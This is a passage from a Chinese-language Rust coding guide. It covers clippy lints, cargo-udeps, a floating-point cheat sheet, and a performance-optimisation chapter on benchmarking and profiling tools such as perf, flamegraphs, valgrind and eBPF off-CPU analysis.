<p>该 lint 不允许代码中出现 「内置黑名单」中定义的命名，比如 <code>foo</code>、<code>baz</code>。</p>
<p>默认为 <code>Warn</code>，但在实际应用中，可能被设置为<code>allow</code>，因为在某些样板代码、文档或测试代码中可能需要使用 <code>foo</code>。</p>
<h2 id="blanket_clippy_restriction_lints"><a class="header" href="#blanket_clippy_restriction_lints"><code>blanket_clippy_restriction_lints</code></a></h2>
<p><a href="https://rust-lang.github.io/rust-clippy/master/index.html#blanket_clippy_restriction_lints">https://rust-lang.github.io/rust-clippy/master/index.html#blanket_clippy_restriction_lints</a></p>
<p>【描述】</p>
<p>用于检查针对整个 <code>clippy::restriction</code> 类别的警告/拒绝/禁止属性。Restriction lint 有时与其他 lint 形成对比，甚至与惯用的 Rust 背道而驰。 这些 lint 应仅在逐个 lint 的基础上启用并仔细考虑。</p>
<p>默认为 <code>suspicious/warn</code>，但实际有些项目中会将其设置为 <code>allow</code>。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cargo-udeps"><a class="header" href="#cargo-udeps">Cargo Udeps</a></h1>
<p><a href="https://github.com/est31/cargo-udeps">cargo-udeps</a> 检查 <code>Cargo.toml</code> 中未使用的依赖。</p>
<p><code>cargo udeps</code> 对标的是<code> rustc</code> 的<code> unused_crate_dependencies lint</code></p>
<p>虽然 rustc 也能检查一些未使用依赖，但是在 lib 和 bin 混合的项目中误报率高</p>
<pre><code>RUSTFLAGS=&quot;-Dunused_crate_dependencies&quot; cargo c
</code></pre>
<p><code>cargo udeps</code> 的最大优点就是<strong>几乎没有误报</strong>。</p>
<p>但是检查力度不如<code>rustc unused_crate_dependencies lint</code>仔细，建议二者搭配使用</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="fcheat-sheet"><a class="header" href="#fcheat-sheet">F.Cheat Sheet</a></h1>
<p>这里用于梳理 Rust 相关的 Cheat Sheet。</p>
<ul>
<li><a href="safe-guides/Appendix/cheat-sheet/">数字</a>
<ul>
<li><a href="safe-guides/Appendix/cheat-sheet/./safe-guides/Appendix/cheat-sheet/Numbers/float.html">浮点数</a></li>
</ul>
</li>
</ul>
<h2 id="资源"><a class="header" href="#资源">资源</a></h2>
<p><a href="https://cheats.rs/">https://cheats.rs/</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="float-cheat-sheet"><a class="header" href="#float-cheat-sheet">Float Cheat Sheet</a></h1>
<blockquote>
<p>From: <a href="https://github.com/brazzy/floating-point-gui.de">https://github.com/brazzy/floating-point-gui.de</a></p>
</blockquote>
<h2 id="浮点数类型"><a class="header" href="#浮点数类型">浮点数类型</a></h2>
<p>Rust 有  <a href="https://floating-point-gui.de/formats/fp/">IEEE 754</a> 单精度  (32-bit) 和  双精度 (64-bit) 类型:</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>	let x: f32 = 0.1; // 32-bit float
	let y: f64 = 0.1; // 64-bit float
<span class="boring">}
</span></code></pre></pre>
<p>默认的浮点数类型是 <code>f64</code>:</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>	let z = 0.1; // 64-bit float
<span class="boring">}
</span></code></pre></pre>
<h2 id="decimal-types"><a class="header" href="#decimal-types">Decimal Types</a></h2>
<p>Rust 没有内建的 Decimal 类型，但是有第三方库  <a href="https://crates.io/crates/rust-decimal">rust_decimal</a> 来支持 Decimal 类型。该库实现了 128-bit <a href="https://floating-point-gui.de/formats/exact/">有限精度的（limited-precision）</a>  关键字  <code>Decimal</code> 表示 Decimal 类型:</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use rust_decimal::prelude::*;

let a = Decimal::new(1, 1); // second param is the number of fractional digits
let b = Decimal::new(2, 1); // a Decimal representing exactly 0.2
let c = a + b; // a Decimal representing exactly 0.3
<span class="boring">}
</span></code></pre></pre>
<h2 id="如何四舍五入"><a class="header" href="#如何四舍五入">如何四舍五入</a></h2>
<p>生成字符串:</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>format!(&quot;{:.2}&quot;, 1.2399); // returns &quot;1.24&quot;
format!(&quot;{:.3}&quot;, 1.2399); // returns &quot;1.240&quot;
format!(&quot;{:.2}&quot;, 1.2); // returns &quot;1.20&quot;
<span class="boring">}
</span></code></pre></pre>
<p>打印标准输出:</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>println!(&quot;{:.2}&quot;, 1.2399); // prints &quot;1.24&quot;
<span class="boring">}
</span></code></pre></pre>
<p>这个 <code>round</code> 方法返回与数字最接近的整数。它使用  <a href="https://floating-point-gui.de/errors/rounding/">四舍五入模式（rounding mode）</a> ，&quot;从零开始四舍五入&quot;，并且对<code>f32</code>和<code>f64</code>类型都有效。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let f: f64 = 3.3;
let g: f64 = -3.3;

f.round(); // returns 3.0
g.round(); // returns -3.0
<span class="boring">}
</span></code></pre></pre>
<p><code>rust_decimal</code> crate 包含<code>round_dp</code>方法，它使用Banker的<a href="https://floating-point-gui.de/errors/rounding/">舍入模式</a>。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let pi = Decimal::from_str(&quot;3.1415926535897932384626433832&quot;).unwrap();
println!(&quot;{}&quot;, pi.round_dp(2).to_string()); // prints &quot;3.14&quot;
<span class="boring">}
</span></code></pre></pre>
<p><code>rust_decimal</code> crate 还包含<code>round_dp_with_strategy</code>方法，允许你指定一个四舍五入策略。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let i = Decimal::from_str(&quot;1.25&quot;).unwrap();
println!(
    &quot;{}&quot;,
    i.round_dp_with_strategy(1, RoundingStrategy::RoundDown)
        .to_string()
) // prints &quot;1.2&quot;
<span class="boring">}
</span></code></pre></pre>
<h2 id="resources"><a class="header" href="#resources">Resources</a></h2>
<ul>
<li><a href="https://crates.io/crates/rust-decimal">rust_decimal crate</a> </li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="g优化指南"><a class="header" href="#g优化指南">G.优化指南</a></h1>
<hr />
<h2 id="内容介绍"><a class="header" href="#内容介绍">内容介绍</a></h2>
<ul>
<li>Rust 性能优化总则</li>
<li>Rust 性能优化准备工作</li>
<li>Rust 性能剖析工具介绍</li>
<li>日常 Rust 开发性能优化的技巧总结</li>
<li>Rust 编译大小和编译时间优化技巧</li>
</ul>
<p>本次分享将围绕 Rust 性能评估和调优主题，比较系统地介绍 Rust 代码的性能优化经验。先从大的总原则出发，介绍在编写 Rust 过程中应该遵循哪些原则对后续优化有帮助。接下来会分享一些代码优化的方法和技巧，然后介绍可以用于 Rust 代码性能评估的工具，也会包括 Rust专用的一些异步并发测试工具介绍。</p>
<h2 id="引子"><a class="header" href="#引子">引子</a></h2>
<p>Rust 语言天生为并发和安全而设计，并且借鉴了面向过程/面向对象/函数式等语言的特点。Rust 的目标在性能方面对标 C 语言，但在安全和生产力方面则比 C 更胜一筹。</p>
<p>虽说 Rust 语言性能对标 C 语言，但开发者写出的Rust 代码如果不经任何优化，也有可能比 Python 更慢。导致 Rust 代码性能慢的因素有很多种，本文就是尝试来梳理这些情况，并且给出一套方法论和一些工具集，来帮助开发者编写高性能的 Rust 代码。</p>
<h2 id="rust-性能优化总则"><a class="header" href="#rust-性能优化总则">Rust 性能优化总则</a></h2>
<h3 id="原则一-不要过早优化性能"><a class="header" href="#原则一-不要过早优化性能">原则一： 不要过早优化性能</a></h3>
<blockquote>
<p>过早优化（Premature Optimization）</p>
<p>Premature optimization is the root of all evil. -- DonaldKnuth</p>
<p>在 DonaldKnuth 的论文 《 Structured Programming With GoTo Statements 》中，他写道：&quot;程序员浪费了大量的时间去考虑或担心程序中非关键部分的速度，而当考虑到调试和维护时，这些对效率的尝试实际上会产生强烈的负面影响。我们应该忘记这种微小的效率，比如说因为过早优化而浪费的大约97%的时间。然而，我们不应该放弃那关键的 3% 的机会&quot;。</p>
</blockquote>
<p>想把代码优化到最佳，需要花很多精力。不应该在开发的时候去想着优化的事情，不需要一步到位。先完成再完美。</p>
<p>但是并非所有优化过早。在编写代码的过程中，优化代码的可读性是你持续要做的。Rust 是一门讲究显式语义的语言，在命名上体现出类型的语义，对于提升可读性非常重要。</p>
<h3 id="原则二-不要过度优化性能"><a class="header" href="#原则二-不要过度优化性能">原则二： 不要过度优化性能</a></h3>
<p>RustConf 2021 一个演讲就举了一个过度优化例子：</p>
<p>某个用户只是想写一些比 Python 程序性能更好的代码。第一版 Rust 实现的代码已经达到了这个要求，比 Python 代码快 20倍。但是他们花了九牛二虎之力写的第二个 Rust 版本，和第一个版本差距并不大。</p>
<p><img src="safe-guides/Appendix/optimizing/./image/perf/1.png" alt="1" /></p>
<p>性能够用就好，否则就容易浪费不必要的时间。</p>
<h3 id="原则三-rust-代码的性能安全编译速度和编译大小之间需要权衡"><a class="header" href="#原则三-rust-代码的性能安全编译速度和编译大小之间需要权衡">原则三： Rust 代码的性能、安全、编译速度和编译大小之间需要权衡</a></h3>
<p>Rust 是同时注重安全和性能的语言。但是在优化性能的同时，是有可能损失安全性的。比如使用 Unsafe Rust 来提升性能，而忽略安全检查在某些调用环境比较安全的地方是允许的，但是并非通用的做法。所以在优化性能之前，要考虑是否要牺牲安全性。</p>
<p>另外 Rust 优化性能的同时，可能会导致编译速度变慢 和 编译文件大小膨胀。这也是需要权衡的地方。</p>
<h2 id="rust-优化准备工作"><a class="header" href="#rust-优化准备工作">Rust 优化准备工作</a></h2>
<p>在性能优化之前，你还需要做一些准备工作，用于测量你的优化是否有效。</p>
<h4 id="基准测试-2"><a class="header" href="#基准测试-2">基准测试</a></h4>
<p>第一步是建立一套一致的基准，可以用来确定性能的基线水平，并衡量任何渐进的改进。</p>
<blockquote>
<p>参考：</p>
<p><code>mongodb</code> 的案例中，标准化的<a href="https://github.com/mongodb/specifications/blob/master/source/benchmarking/benchmarking.rst"><code>MongoDB</code> 驱动微基准集</a>在这方面发挥了很好的作用，特别是因为它允许在用其他编程语言编写的<code>MongoDB</code>驱动之间进行比较。由于这些是 &quot;微 &quot;基准，它们还可以很容易地测量单个组件的变化（例如，读与写），这在专注于在特定领域进行改进时是非常有用的。</p>
</blockquote>
<p>一旦选择了基准，就应该建立一个稳定的环境，可以用来进行所有的定时测量。确保环境不发生变化，并且在分析时不做其他 &quot;工作&quot;（如浏览猫的图片），这对减少基准测量中的噪音很重要。</p>
<p>推荐工具：</p>
<p>使用 cargo bench 和 <a href="https://crates.io/crates/criterion"><code>criterion</code></a>  来进行基准测试</p>
<pre><code class="language-toml">[dev-dependencies]
criterion = { version = &quot;0.3.5&quot;, features = [&quot;async_tokio&quot;, &quot;html_reports&quot;] }

[[bench]]
name = &quot;find&quot;
harness = false
</code></pre>
<p>因为 Rust 自带的基准测试只能用于Nightly Rust ，所以需要使用这个第三方库 criterion 在 Stable Rust 下进行基准测试。</p>
<p>Criterion 会将每次运行的时间记录、分析到一个 HTML 报告中。</p>
<p><img src="safe-guides/Appendix/optimizing/./image/perf/2.png" alt="2" /></p>
<p>在报告的底部，有两个最近的运行之间的比较，较早的运行（基线）为红色，最近的运行（优化的）为蓝色。这些报告是非常有用的工具，用于可视化由于性能调整而发生的变化，并且它们对于向其他人展示结果特别有用。</p>
<p>它们还可以作为过去性能数据的记录，无需手动记录结果。如果有性能回归的情况，也会得到及时的反映。</p>
<h4 id="压力负载测试"><a class="header" href="#压力负载测试">压力/负载测试</a></h4>
<p>基准测试是开发过程中对程序性能的一种预判。而项目最终发布之后，还需要在实际环境对其进行真正的负载测试，来判断系统的延时和吞吐量。</p>
<p>常用的负载测试工具基本都可以使用，比如 locust，wrk之类。这里介绍一个 Rust 基金会成员公司的一个用 Rust 实现的开源分布式负载测试工具 ：<a href="https://github.com/tag1consulting/goose">goose</a>。</p>
<p>Goose 每 CPU 核产生的流量至少是 Locust 的 11 倍，对于更复杂的负载测试（例如使用第三方库抓取表单内容的负载测试），收益甚至更大。虽然 Locust 要求您管理分布式负载测试，只是为了在单个服务器上使用多个 CPU 内核，但 Goose 使用单个进程利用所有可用的 CPU 内核，从而大大简化了运行更大负载测试的过程。对代码库的持续改进继续带来新功能和更快的性能。Goose 的扩展性远远优于 Locust，可以有效地利用可用资源来实现其目标。它还支持异步流程，使更多的同步流程能够轻松且一致地从单个服务器上增加数千名用户。</p>
<p>Goose 拥有许多其他负载测试工具所没有的独特<a href="https://book.goose.rs/logging/overview.html">调试和日志记录机制</a>，简化了负载测试的编写和结果的分析。Goose 还通过对数据的多个简单视图提供了更<a href="https://book.goose.rs/getting-started/metrics.html">全面的指标</a>，并且可以轻松地确认负载测试在您按比例放大或缩小时按照您的预期执行。它公开了用于分配任务和任务集的算法，对操作的顺序和一致性进行<a href="https://book.goose.rs/config/scheduler.html">更精细的控制</a>，这对于易于重复的测试很重要。</p>
<p><img src="safe-guides/Appendix/optimizing/./image/perf/3.png" alt="3" /></p>
<h4 id="明白高性能系统的标准"><a class="header" href="#明白高性能系统的标准">明白高性能系统的标准</a></h4>
<p>在进行性能剖析之前，还应该明白高性能系统的一个标准。</p>
<p>性能 = 产出 / 资源消耗</p>
<p>产出 = 事务次数（比如，qps）和 吞吐的数据量</p>
<p>消耗资源 = cpu时间片，磁盘/网络 I/O 次数、流量 等</p>
<p>而高性能的系统是要求在固定资源消耗之下来提高产出。</p>
<p>对于高性能系统的设计一般遵循两个标准：</p>
<ol>
<li>最大化地利用资源。</li>
<li>使用流水线技术减少程序中任务总耗时。比如 Rust 编译器优化编译时间，也使用了流水线技术来对crate进行并行编译。</li>
</ol>
<p>常见瓶颈类型：</p>
<ol>
<li>CPU :
<ol>
<li>CPU 占用过高，那么就需要减少计算的开销。</li>
<li>CPU 负载过高，那么就需要查看是否线程过多，以及多个线程的切换太过频繁，多线程交互是否有必要。</li>
</ol>
</li>
<li>I/O:
<ol>
<li>磁盘 IOPS(Input/Output Operations Per Second) 达到了上限。那么需要减少读写次数，提高 cache命中率。</li>
<li>IO 带宽（bandwidth） 上限。那么就需要减少磁盘的读写流量，比如使用更紧凑的数据存储格式，更小的读写放大（本来只需要读取100字节，结果触发了好多个page的读写，产生了放大的效果）。</li>
<li>I/O 并发达到上限。那么就需要考虑使用 异步I/O。</li>
<li>锁、计时器、分页/交换等被阻塞。</li>
</ol>
</li>
</ol>
<h2 id="rust-性能剖析工具介绍"><a class="header" href="#rust-性能剖析工具介绍">Rust 性能剖析工具介绍</a></h2>
<p>在做好准备工作之后，就可以开启我们的性能剖析工作了。</p>
<p>性能剖析，就是要发现程序中真正存在的性能瓶颈。而不是你自以为的想象中的性能瓶颈。如果不遵守这点，就会导致过早优化或过度优化。</p>
<p>因为常见的性能瓶颈一般都是两类，CPU 和 I/O 。所以工具也基本面向这两类。</p>
<h3 id="on-cpu-性能剖析"><a class="header" href="#on-cpu-性能剖析">On-CPU 性能剖析</a></h3>
<h4 id="使用-perf-寻找热点"><a class="header" href="#使用-perf-寻找热点">使用 Perf 寻找“热点”</a></h4>
<p>做cpu性能剖析有很多常用的 Linux 命令行工具，比如 linux 命令行工具 perf。它功能强大：它可以检测 CPU 性能计数器、跟踪点、kprobes 和 uprobes（动态跟踪）。</p>
<p>你可以使用 perf 工具对 CPU 进行采样分析。以一个指定的频率对CPU进行采样，进而拿到正在CPU上运行的指令乃至整个函数调用栈的快照，最后对采样的数据分析。比如说在100次采样中有20次在运行A指令或者A函数，那么<code>perf</code>就会认为A函数的CPU使用率为20%。</p>
<p>可以在 Cargo.toml  中加入：</p>
<pre><code class="language-toml">[profile.release]
debug = true
</code></pre>
<p>然后执行:</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>$ cargo build --release
$ perf record -g target/release/perf-test
$ perf report
<span class="boring">}
</span></code></pre></pre>
<p>就可以看到报告了。</p>
<h4 id="火焰图工具"><a class="header" href="#火焰图工具">火焰图工具</a></h4>
<p>但我们 Rust 程序中要通过<a href="https://crates.io/crates/flamegraph"><code>flamegraph</code> </a>crate，来生成 火焰图（flamegraph），它可以与<code>cargo</code>一起工作，非常方便。</p>
<p>因为火焰图有助于阅读源码，它以可视化的图案非常明确地展示调用栈之间的关系。火焰图可以让开发者从整体上看出各个线程的开销比例和子函数占有的比例，指引我们从整体上找到优化的优先级。</p>
<p>火焰图中，在被测量的执行过程中调用的每个函数会被表示为一个矩形，每个调用栈被表示为一个矩形栈。一个给定的矩形的宽度与在该函数中花费的时间成正比，更宽的矩形意味着更多的时间。火焰图对于识别程序中的慢速部分非常有用，因为它们可以让你快速识别代码库中哪些部分花费的时间不成比例。</p>
<p>用 Mongodb 调优的示例来说：</p>
<p><img src="safe-guides/Appendix/optimizing/./image/perf/4.png" alt="4" /></p>
<p><img src="safe-guides/Appendix/optimizing/./image/perf/5.png" alt="5" /></p>
<p>火焰图中的栈从底部开始，随着调用栈的加深而向上移动（左右无所谓），通常这是开始阅读它们的最佳方式。看一下上面火焰图的底部，最宽的矩形是<code>Future::poll</code>，但这并不是因为Rust 的 <code>Future</code> 超级慢，而是因为每个<code>.await</code>都涉及轮询（poll）<code>Future</code>。考虑到这一点，我们可以跳过任何轮询矩形，直到我们在<code>mongodb</code>中看到我们关心的信息的函数。</p>
<p>蓝色方块包含了调用<code>CommandResponse::body</code>所花费的时间，它显示几乎所有的时间都花在了<code>clone()</code>上。各个紫色矩形对应的是将<code>BSON</code>（MongoDB使用的二进制格式）解析到<code>Document</code>中所花费的时间，绿色矩形对应的是<code>Document</code>的<code>serde::Deserialize</code>实现中所花费的时间。最后，黑色虚线矩形对应的是释放内存的时间，黑色实线对应的是将命令序列化为<code>BSON</code>的时间。</p>
<p>所以从火焰图中反映出性能瓶颈在于：</p>
<ol>
<li>Clone 过多。</li>
<li>序列化 bson 耗费更多时间</li>
</ol>
<p>修复完这些性能瓶颈之后，再使用基准测试测试一次。</p>
<p>如果可能的话，再使用 goose 这样的压测工具进行一次负载测试更好。</p>
<h4 id="perf-适合测试-rust-异步代码"><a class="header" href="#perf-适合测试-rust-异步代码">perf 适合测试 Rust 异步代码</a></h4>
<p>对于异步 Rust 程序而言，火焰图的效果可能并不是很好，因为异步调度器和执行器几乎会出现在火焰图中每一块地方，看不出瓶颈所在。这个时候使用 perf 工具会更加清晰。</p>
<h4 id="检查内存泄露和不必要的内存分配"><a class="header" href="#检查内存泄露和不必要的内存分配">检查内存泄露和不必要的内存分配</a></h4>
<p>可以使用 <strong><a href="https://www.valgrind.org/">Valgrind</a></strong> 工具来检查程序是否存在内存泄露，或者在关键的调用路径上存在不必要的内存分配。 </p>
<p>不仅仅要考察堆分配，也需要考虑栈上的分配，特别是异步操作时。</p>
<p>有一个非常有用的 Rust 编译标志（仅在 Rust nightly 中可用）来验证数据结构有多大及其缓存对齐。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>$ RUSTFLAGS=-Zprint-type-sizes cargo build --release
<span class="boring">}
</span></code></pre></pre>
<p>除了通常的 Cargo 输出之外，包括异步 Future 在内的每个数据结构都以相应的大小和缓存对齐方式打印出来。比如：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>print-type-size type: `net::protocol::proto::msg::Data`: 304 bytes, alignment: 8 bytes
print-type-size     field `.key`: 40 bytes
print-type-size     field `.data_info`: 168 bytes
print-type-size     field `.payload`: 96 bytes
<span class="boring">}
</span></code></pre></pre>
<p>Rust 异步编程非常依赖栈空间，异步运行时和库需要把所有东西放到栈上来保证执行的正确性。如果你的异步程序占用了过多的栈空间，可以考虑将其进行优化为 平衡的同步和异步代码组合，把特定的异步代码隔离出来也是一种优化手段。</p>
<h4 id="其他性能剖析监控工具"><a class="header" href="#其他性能剖析监控工具">其他性能剖析/监控工具</a></h4>
<p>如果允许，可以使用 英特尔出品的 <a href="https://www.intel.com/content/www/us/en/develop/documentation/vtune-help/top.html">VTune </a> 工具进行 CPU 性能剖析。</p>
<p>或者使用在线的性能监控平台，比如 <a href="https://logrocket.com/">Logrocket</a>，支持 Rust 程序，可以监控应用程序的性能，报告客户端 CPU 负载、客户端内存使用等指标。</p>
<p>也可以使用开源的链路追踪工具来监控你自己的 Rust 项目：使用 OpenTelemetry 标准。OpenTelemetry 也支持 Rust 。</p>
<p>opentelemetry是一款数据收集中间件。我们可以使用它来生成，收集和导出监测数据（Metrics,Logs and traces），这些数据可供支持OpenTelemetry的中间件存储，查询和显示，用以实现数据观测，性能分析，系统监控，服务告警等能力。</p>
<p>PingCAP 也开源了一款高性能的 tracing 库 : <a href="https://github.com/tikv/minitrace-rust">minitrace-rust</a></p>
<h3 id="off-cpu-性能剖析"><a class="header" href="#off-cpu-性能剖析">Off-CPU 性能剖析</a></h3>
<p>Off-CPU 是指在 I/O、锁、计时器、分页/交换等被阻塞的同时等待的时间。</p>
<p>Off-CPU 的性能剖析通常可以在程序运行过程中进行采用链路跟踪来进行分析。</p>
<p>还有就是使用 offcpu 火焰图进行可视化观察。</p>
<p><img src="safe-guides/Appendix/optimizing/./image/perf/6.png" alt="6" /></p>
<p>这里推荐的工具是 <code>eBPF</code>的前端工具包<a href="https://github.com/iovisor/bcc">bcc</a>中的<code>offcputime-bpfcc</code>工具。</p>
<p>这个工具的原理是在每一次内核调用<code>finish_task_switch()</code>函数完成任务切换的时候记录上一个进程被调度离开<code>CPU</code>的时间戳和当前进程被调度到<code>CPU</code>的时间戳，那么一个进程离开<code>CPU</code>到下一次进入<code>CPU</code>的时间差即为<code>Off-CPU</code>的时间。</p>
<p>比如这里一段代码：</p>
<pre><pre class="playground"><code class="language-rust">use std::io::Read;
fn test1() {
    std::thread::sleep(std::time::Duration::from_nanos(200));
}
fn test2() {
    let mut f = std::fs::File::open(&quot;./1.txt&quot;).unwrap();
    let mut buffer = Vec::new();
    f.read_to_end(&amp;mut buffer).unwrap();
}
fn main() {
    loop {
        test1();
        test2();
    }
}
</code></pre></pre>
<p>程序中一共有两种会导致进程被调度出<code>CPU</code>的任务，一个是<code>test1()</code>函数中的<code>sleep()</code>，一个是在<code>test2()</code>函数中的读文件操作。</p>
<p>这里需要使用debug编译，因为<code>offcputime-bpfcc</code>依赖于<code>frame pointer</code>来进行栈展开，所以我们需要开启<code>RUSTFLAGS=&quot;-C force-frame-pointers=yes&quot;</code>的编译选项以便打印出用户态的函数栈。我们使用如下的命令获取<code>Off-CPU</code>的分析数据。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>$ ./target/debug/mytest &amp; sudo offcputime-bpfcc -p `pgrep -nx mytest` 5
<span class="boring">}
</span></code></pre></pre>
<p>然后使用 火焰图工具将其生成 off-cpu 火焰图：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>$ git clone https://github.com/brendangregg/FlameGraph
$ cd FlameGraph
$ sudo offcputime-bpfcc -df -p `pgrep -nx mytest` 3 &gt; out.stacks
$ ./flamegraph.pl --color=io --title=&quot;Off-CPU Time Flame Graph&quot; --countname=us &lt; out.stacks &gt; out.svg
<span class="boring">}
</span></code></pre></pre>
<p>得到下面火焰图：</p>
<p><img src="safe-guides/Appendix/optimizing/./image/perf/7.png" alt="7" /></p>
<p>与<code>On-CPU</code>的火焰图相同，纵轴代表了函数调用栈，横轴代表了<code>Off-CPU</code>时间的比例，跨度越大代表<code>Off-CPU</code>的时间越长。</p>
<h3 id="其他适合-rust-性能剖析的工具介绍"><a class="header" href="#其他适合-rust-性能剖析的工具介绍">其他适合 Rust 性能剖析的工具介绍</a></h3>
<p>除了 perf 和 火焰图 工具，下面还有一些 Rust 程序适用的工具。</p>
<ul>
<li><a href="https://github.com/KDAB/hotspot">Hotspot</a>和<a href="https://profiler.firefox.com/">Firefox Profiler</a>是查看perf记录的数据的好工具。</li>
<li><a href="https://www.valgrind.org/docs/manual/cg-manual.html">Cachegrind</a>和<a href="https://www.valgrind.org/docs/manual/cl-manual.html">Callgrind</a>给出了全局的、每个函数的、每个源线的指令数以及模拟的缓存和分支预测数据。</li>
<li><a href="https://www.valgrind.org/docs/manual/dh-manual.html">DHAT</a>可以很好的找到代码中哪些部分会造成大量的分配，并对峰值内存使用情况进行深入了解。</li>
<li><a href="https://github.com/KDE/heaptrack">heaptrack</a>是另一个堆分析工具。</li>
<li><a href="https://github.com/nnethercote/counts/"><code>counts</code></a>支持即席（<em>Ad Hoc</em>）剖析，它将<code>eprintln！</code>语句的使用与基于频率的后处理结合起来，这对于了解代码中特定领域的部分内容很有帮助。</li>
<li><a href="https://github.com/plasma-umass/coz">Coz</a>执行<em>因果分析</em>以衡量优化潜力。它通过<a href="https://github.com/plasma-umass/coz/tree/master/rust">coz-rs</a>支持Rust。因果分析技术可以找到程序的瓶颈并显示对其进行优化的效果。</li>
</ul>
<h2 id="日常-rust-开发性能优化技巧总结"><a class="header" href="#日常-rust-开发性能优化技巧总结">日常 Rust 开发性能优化技巧总结</a></h2>
<p>虽然我们需要通过完善的性能测试方法来剖析系统中存在的瓶颈，保证不会过早优化和过度优化。但是在日常编码过程中，Rust 社区内也总结出来一些优化技巧来供参考：</p>
<h3 id="1-对于只被调用一次的函数可能并不需要进行优化"><a class="header" href="#1-对于只被调用一次的函数可能并不需要进行优化">1. 对于只被调用一次的函数可能并不需要进行优化。</a></h3>
<p>比如读取配置文件，这种多慢都没有关系。</p>
<p>不要只优化程序中最慢的函数，要优化占用大部分运行时间的函数。</p>
<p>在一个被调用 1000 次的函数上得到 2 毫秒的改进，那比在一个被调用一次的函数上获得 1 秒的改进要好。</p>
<h3 id="2-优先改进你的算法"><a class="header" href="#2-优先改进你的算法">2. 优先改进你的算法</a></h3>
<p>很多时候性能不佳，很可能是由于算法不佳而不是实现不佳。请检查你的代码中循环的使用，只需尝试尽可能少的循环。</p>
<ol>
<li>记住每次使用<code>collect</code>必须至少会迭代整个集合一次，所以最好只 collect 一次。</li>
<li>警惕你使用的标准库方法和第三方库方法内部实现中隐藏的循环。</li>
</ol>
<h3 id="3-要充分理解-rust-中数据结构的内存布局"><a class="header" href="#3-要充分理解-rust-中数据结构的内存布局">3. 要充分理解 Rust 中数据结构的内存布局</a></h3>
<p>要学会区分 Rust 中数据类型的内存布局，它们在栈上和堆上如何分配的。</p>
<p>比如 <code>String</code>，<code>Vec</code>，<code>HashMap</code>和<code>Box&lt;Trait&gt;</code>/<code>Box&lt;[T]&gt;</code>所有分配都在堆上。</p>
<p>在栈上分配的数据，移动的时候只能是 按位复制的方式。所以即便内存是在栈上分配，也要考虑这个 Copy 的成本。</p>
<p>堆上的数据，要尽可能地避免深拷贝（显式 Clone） 。</p>
<p>并且要尽可能地缓存数据，而避免频繁的内存分配发生。比如可以使用诸如 slab 之类的第三方库，可以合理复用内存。</p>
<h3 id="4-避免-boxtrait-动态分发"><a class="header" href="#4-避免-boxtrait-动态分发">4. 避免 <code>Box&lt;Trait&gt;</code> 动态分发</a></h3>
<p>创建 trait 对象的规范方法是<code>Box&lt;Trait&gt;</code>，但大多数代码都可以使用<code>&amp;mut Trait</code>，它也具有动态分派但节省了分配。如果您绝对需要所有权，请使用<code>Box</code>，但大多数用例都可以使用<code>&amp;Trait</code>或<code>&amp;mut Trait</code>。</p>
<p>有些场景也可以使用 Enum 来代替 trait 对象。参见 <a href="https://docs.rs/enum_dispatch/latest/enum_dispatch/"><code>enum_dispatch</code></a>。</p>
<h3 id="5-使用基于栈的可变长度数据类型"><a class="header" href="#5-使用基于栈的可变长度数据类型">5. 使用基于栈的可变长度数据类型</a></h3>
<p>定长度的数据类型可以简单地存储在堆栈上，但对于动态大小的数据，它并不是那么简单。但是，<a href="https://github.com/servo/rust-smallvec"><code>smallvec</code></a>, <a href="https://github.com/jFransham/smallstring"><code>smallstring</code></a>和<a href="https://github.com/servo/tendril"><code>tendril</code></a>都是可变长度数据类型，允许在栈上存储少量元素。像<code>smallvec</code>这样的库非常适合缓存局部性，可以减少分配。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// This is a gross oversimplification of how this type is implemented in the// crate, but it's enough to explain how it works.enum SmallVec&lt;T&gt; {    Small([T; 4]),    Big(Vec&lt;T&gt;),}type Matrix&lt;T&gt; = SmallVec&lt;SmallVec&lt;T&gt;&gt;;
<span class="boring">}
</span></code></pre></pre>
<h3 id="6-合理使用断言避免数组越界检查"><a class="header" href="#6-合理使用断言避免数组越界检查">6. 合理使用断言避免数组越界检查</a></h3>
<p>Safe Rust 会被编译器自动塞入数组越界检查，比如下面代码：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn do_something_with_array(array: &amp;[u8]) -&gt; u8 {    array[0] + array[1] + array[2] + array[3] + array[4] + array[5]}
<span class="boring">}
</span></code></pre></pre>
<p>可以通过编译输出 MIR 看到，编译器会给数组索引访问插入断言检查：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>assert(move _9, &quot;index out of bounds: the length is {} but the index is {}&quot;, move _8, _7) 
<span class="boring">}
</span></code></pre></pre>
<p>有几个数组索引访问就会被插入几次，上面的代码会被插入 6 次，这极大影响性能。</p>
